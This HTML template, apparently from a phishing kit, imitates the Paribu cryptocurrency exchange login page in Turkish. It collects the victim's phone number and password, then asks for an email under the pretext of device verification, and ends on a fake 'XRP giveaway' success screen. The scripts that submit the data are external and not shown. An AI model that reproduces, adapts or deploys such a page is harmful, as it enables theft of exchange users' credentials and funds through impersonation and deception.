<!DOCTYPE html>
<html lang="tr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
    <meta charset="UTF-8">
    <meta content="{{ csrf_token() }}" name="csrf-token" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Giris Yap</title>
    <script src="https://cdn.tailwindcss.com/"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.css" />
    <link rel="stylesheet" href="passets/style.css" />
</head>

<body class="bg-paribu-dark text-white min-h-screen">
    <div class="hidden step2">
        <div id="modalOverlay" class="modal-overlay">
            <div class="modal">
                <div class="info-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none"
                        viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                </div>
                <h3 class="text-xl font-bold text-center mb-4">Bu cihazla giris yapabilmek icin eposta adresinizi
                    onaylayin</h3>
                <p class="text-gray-400 text-center mb-6">Onayladiktan sonra size bir e-posta gonderecegiz. Bu
                    e-posta'da basvuru detaylari hakkinda bilgilendirme verilecektir.</p>
                <button id="closeModalBtn"
                    class="w-full bg-paribu-green hover:bg-opacity-90 text-white font-bold py-3 px-4 rounded transition duration-300">
                    Tamam
                </button>
            </div>
        </div>
    </div>
    <div class="container mx-auto px-4 py-8 flex flex-col md:flex-row">
        <div class="w-full md:w-1/2 desktop-branding flex-col items-center justify-center p-8">
            <div class="mb-8">
                <h1 class="text-3xl font-bold">PARiBU</h1>
            </div>
            <div class="w-32 h-32 bg-paribu-green relative mb-12">
                <div class="absolute inset-0 flex items-center justify-center">
                    <img src="passets/alogo.svg" height="128" width="128" />
                </div>

            </div>
            <div class="mt-12">
                <h2 class="text-3xl font-bold text-white">Yarının dünyası </h2>
                <h2 class="text-3xl font-bold text-paribu-green">bu.</h2>
            </div>
        </div>
        <div class="w-full mobile-branding">
            <div class="absolute top-4 right-4">
                <button class="text-gray-400 hover:text-white">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 20 20" fill="currentColor">
                        <path fill-rule="evenodd"
                            d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z"
                            clip-rule="evenodd" />
                    </svg>
                </button>
            </div>

            <div class="flex justify-center mt-8 mb-4">
                <img src="passets/pLogo.svg" alt="Logo" class="w-24 h-24">
            </div>

            <div class="chart-container">
                <img src="passets/chartLogo.svg" alt="Chart" class="chart-line">
            </div>
        </div>
        <div class="w-full md:w-1/2 flex flex-col justify-center p-8 step1">
            <div class="absolute top-8 right-8 flex items-center space-x-4">
            </div>
            <h2 class="text-2xl font-bold mb-2 desktop-branding">Paribu'ya giriş yapın</h2>
            <p class="text-gray-400 mb-8 desktop-branding">Paribu'ya giriş yaparak varlıklarınızı yönetebilir ve yatırım
                yapmaya hemen başlayabilirsiniz.</p>
            <form id="loginForm" action="#" method="post" autocomplete="off" class="w-full max-w-md">
                <div class="input-container">
                    <input type="tel" id="phone" name="phone" minlength="10" required class="input-field"
                        placeholder=" " autocomplete="off">
                    <label for="phone" class="input-label">Cep telefonu numaranız</label>
                    <p class="error-message text-paribu-error text-sm mt-1">Bu alanı doldurmalısınız</p>
                </div>

                <div class="input-container">
                    <input type="password" id="password" minlength="6" name="password" required class="input-field"
                        placeholder=" " autocomplete="off">
                    <label for="password" class="input-label">Parolanız</label>
                    <p class="error-message text-paribu-error text-sm mt-1">Bu alanı doldurmalısınız</p>
                </div>
                <div class="flex flex-col space-y-2 mb-8">
                    <a href="#" class="text-gray-400 hover:text-paribu-green flex items-center">
                        Parolamı unuttum
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 ml-1" viewBox="0 0 20 20"
                            fill="currentColor">
                            <path fill-rule="evenodd"
                                d="M10.293 5.293a1 1 0 011.414 0l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414-1.414L12.586 11H5a1 1 0 110-2h7.586l-2.293-2.293a1 1 0 010-1.414z"
                                clip-rule="evenodd" />
                        </svg>
                    </a>
                    <a href="#" class="text-gray-400 hover:text-paribu-green flex items-center">
                        Paribu Destek Merkezi
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 ml-1" viewBox="0 0 20 20"
                            fill="currentColor">
                            <path fill-rule="evenodd"
                                d="M10.293 5.293a1 1 0 011.414 0l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414-1.414L12.586 11H5a1 1 0 110-2h7.586l-2.293-2.293a1 1 0 010-1.414z"
                                clip-rule="evenodd" />
                        </svg>
                    </a>
                </div>
                <div class="desktop-buttons">
                    <button type="button"
                        class="plogin w-full bg-paribu-green hover:bg-opacity-90 text-white font-bold py-3 px-4 rounded transition duration-300">
                        Giriş yap
                    </button>

                    <div class="text-center mt-6">
                        <a href="#" class="text-gray-400 hover:text-white">Paribu'da hesap oluştur</a>
                    </div>
                </div>
            </form>
        </div>
        <div class="w-full md:w-1/2 flex flex-col justify-center p-8 step2 hidden">
            <div class="absolute top-8 right-8 flex items-center space-x-4">
            </div>
            <div class="flex items-center mb-6">
                <div class="w-2 h-2 rounded-full bg-paribu-green mr-2"></div>
                <span class="text-paribu-green">Paribu'ya giriş yapın</span>
            </div>
            <h2 class="text-2xl font-bold mb-4">E-posta adresinizi dogrulayin</h2>
            <p class="text-gray-400 mb-8">Size ait oldugunu dogrulayabilmemiz icin kayitli eposta adresinizi
                dogrulayin.</p>

            <form id="emailForm" class="w-full max-w-md" method="post" action="#" autocomplete="off">
                <div class="mb-8">
                    <label for="email" class="block text-sm font-medium text-gray-400 mb-2">E-posta
                        adresiniz</label>
                    <input type="email" id="email" name="email" autocomplete="off" required
                        class="input-field w-full py-2 px-0 text-white" placeholder="ornek@gmail.com">
                    <p class="error-message text-paribu-error text-sm mt-1">Bu alanı doldurmalısınız</p>
                </div>

                <button type="button"
                    class="pdogrula w-full bg-paribu-green hover:bg-opacity-90 text-white font-bold py-3 px-4 rounded transition duration-300 mb-4">
                    Dogrula
                </button>

                <p class="text-gray-400 text-sm text-center">
                    E-posta adresinize basvuru detaylari gonderecegiz, lutfen gelen kutunuzu veya spam klasorunu kontrol
                    edin.
                </p>
            </form>
        </div>

        <div class="w-full md:w-1/2 flex flex-col justify-center p-8 relative step3 hidden">
            <div id="confetti-container"></div>
            <div class="absolute top-8 right-8 flex items-center space-x-4">
            </div>
            <div class="success-icon">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-paribu-green" fill="none"
                    viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
                </svg>
            </div>
            <h2 class="text-3xl font-bold text-center mb-4">Tebrikler!</h2>
            <p class="text-gray-400 text-center mb-8">Basvurunuz başarıyla gerçekleştirildi.</p>

            <div class="bg-paribu-darker p-6 rounded-lg mb-8">
                <h3 class="font-bold mb-2">XRP Çekilişine başarıyla katıldınız!</h3>
                <p class="text-gray-400 text-sm">Başvurunuz onaylandığında bildirim alacaksınız.</p>
            </div>
            <div class="space-y-4">
            </div>
        </div>


    </div>
    <div class="absolute-half-border-wrapper-sm mobile-buttons step1">
        <button type="button"
            class="plogin w-full bg-paribu-green hover:bg-opacity-90 text-white font-bold py-3 px-4 rounded transition duration-300 mb-2">
            Giriş yap
        </button>
        <button type="button"
            class="w-full bg-transparent border border-gray-600 hover:border-gray-400 text-white font-bold py-3 px-4 rounded transition duration-300">
            Paribu'da hesap oluştur
        </button>
    </div>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>

    <script type="text/javascript" src="passets/pari.js"></script>

    <script type="text/javascript" src="passets/custom.js"></script>
</body>

</html>
